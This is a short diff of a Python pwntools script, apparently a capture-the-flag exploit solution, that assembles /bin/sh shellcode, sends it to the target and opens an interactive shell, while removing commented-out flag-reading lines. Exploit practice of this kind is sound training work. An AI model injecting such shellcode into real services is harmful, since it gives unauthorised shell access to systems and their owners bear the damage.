@@ -43,10 +43,9 @@ continue
 
 io = start()
 
+# just works. Thanks pwntools
 shellcode = asm(shellcraft.sh())
 io.recv()
 io.send(shellcode)
-# flag = io.recv(...)
-# log.success(flag)
 
 io.interactive()
